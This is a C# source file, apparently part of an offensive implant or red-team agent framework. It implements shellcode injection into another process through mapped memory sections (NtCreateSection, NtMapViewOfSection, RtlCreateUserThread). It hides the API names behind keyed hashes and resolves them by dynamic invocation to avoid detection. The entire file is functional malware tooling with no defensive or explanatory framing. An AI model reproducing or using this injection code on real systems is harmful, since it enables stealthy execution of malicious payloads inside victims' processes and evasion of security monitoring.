using Agent;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Invoker.Dynamic;
using System;

namespace Agent
{
    internal class MapViewOfSection : ITechnique
    {
        int ITechnique.id => 2;
        private long key = 0x617468656E61;
        private Dictionary<string, string> map = new Dictionary<string, string>()
        {
            { "ncs", "F02C007B9EA8335BDD3ED4A0CCA00C19" },
            { "nmvos", "40D0EA186AB9C28518E31DBF4149F653" },
            { "rcut", "ACCEA385032CC00E5FA4B2A5EC57C8F3" },
            { "ntd", "532FBE7D503E25FEDC8544721B744E16" }
        };
        private delegate uint nmpvosDelegate(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, ref ulong SectionOffset, ref ulong ViewSize, uint InheritDisposition, uint AllocationType, Native.MemoryProtection Win32Protect);
        private delegate uint ncsDelegate(ref IntPtr SectionHandle, Native.SectionAccess DesiredAccess, IntPtr ObjectAttributes, ref ulong MaximumSize, Native.MemoryProtection SectionPageProtection, Native.MappingAttributes AllocationAttributes, IntPtr FileHandle);
        private delegate IntPtr rcutDelegate(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, int stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, Native.CLIENT_ID clientId);
        public bool Inject(byte[] shellcode, IntPtr hTarget)
        {
            return Run(shellcode, hTarget);
        }

        public bool Inject(byte[] shellcode, Process proc)
        {
            return Run(shellcode, proc.Handle);
        }

        private bool Run(byte[] shellcode, IntPtr htarget)
        {
            var ntdMod = Generic.GetLoadedModuleAddress(map["ntd"], key);

            if(ntdMod == IntPtr.Zero)
            {
                return false;
            }

            var ncsFunc = Generic.GetExportAddress(ntdMod, map["ncs"], key);
            var mvsFunc = Generic.GetExportAddress(ntdMod, map["nmvos"], key);
            var rcutFunc = Generic.GetExportAddress(ntdMod, map["rcut"], key);

            if(rcutFunc == IntPtr.Zero || mvsFunc == IntPtr.Zero || ncsFunc == IntPtr.Zero)
            {
                Console.WriteLine("Failed to find required api's");
                return false;
            } 

            IntPtr hSectionHandle = IntPtr.Zero;
            IntPtr pLocalView = IntPtr.Zero;
            UInt64 size = (UInt32)shellcode.Length;

            // create a new section to map view to
            object[] ncsParams = new object[] { hSectionHandle, Native.SectionAccess.SECTION_ALL_ACCESS, IntPtr.Zero, size, Native.MemoryProtection.PAGE_EXECUTE_READWRITE, Native.MappingAttributes.SEC_COMMIT, IntPtr.Zero };
            UInt32 result = Generic.DynamicFunctionInvoke<UInt32>(ncsFunc, typeof(ncsDelegate), ref ncsParams);

            if (result != 0)
            {
                return false;
            }
            // create a local view
            const UInt32 ViewUnmap = 0x2;
            UInt64 offset = 0;

            //Manually get the values of the out parameters from dinvoke
            hSectionHandle = (nint)ncsParams[0];
            size = (ulong)ncsParams[3];

            object[] nmvosParams = new object[] { hSectionHandle, (IntPtr)(-1), pLocalView, UIntPtr.Zero, UIntPtr.Zero, offset, size, ViewUnmap, (UInt32)0, Native.MemoryProtection.PAGE_READWRITE };
            result = Generic.DynamicFunctionInvoke<UInt32>(mvsFunc, typeof(nmpvosDelegate), ref nmvosParams);


            if (result != 0)
            {
                return false;
            }

            //Manually get the values of the out parameters from dinvoke
            pLocalView = (nint)nmvosParams[2];
            offset = (ulong)nmvosParams[5];
            size = (ulong)nmvosParams[6];

            // copy shellcode to the local view
            Marshal.Copy(shellcode, 0, pLocalView, shellcode.Length);
            // create a remote view of the section in the target
            IntPtr pRemoteView = IntPtr.Zero;
            
            object[] nmvosParams2 = new object[] { hSectionHandle, htarget, pRemoteView, UIntPtr.Zero, UIntPtr.Zero, offset, size, ViewUnmap, (UInt32)0, Native.MemoryProtection.PAGE_EXECUTE_READ };
            result = Generic.DynamicFunctionInvoke<UInt32>(mvsFunc, typeof(nmpvosDelegate), ref nmvosParams2);

            pRemoteView = (nint)nmvosParams2[2];

            // execute the shellcode
            IntPtr hThread = IntPtr.Zero;
            Native.CLIENT_ID cid = new Native.CLIENT_ID();

            object[] rcutParams = new object[] { htarget, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, hThread, cid };
            var res = Generic.DynamicFunctionInvoke<nint>(rcutFunc, typeof(rcutDelegate), ref rcutParams);

            hThread = (nint)rcutParams[8];
            
            //Need to unmap?
            return true;
        }
    }
}
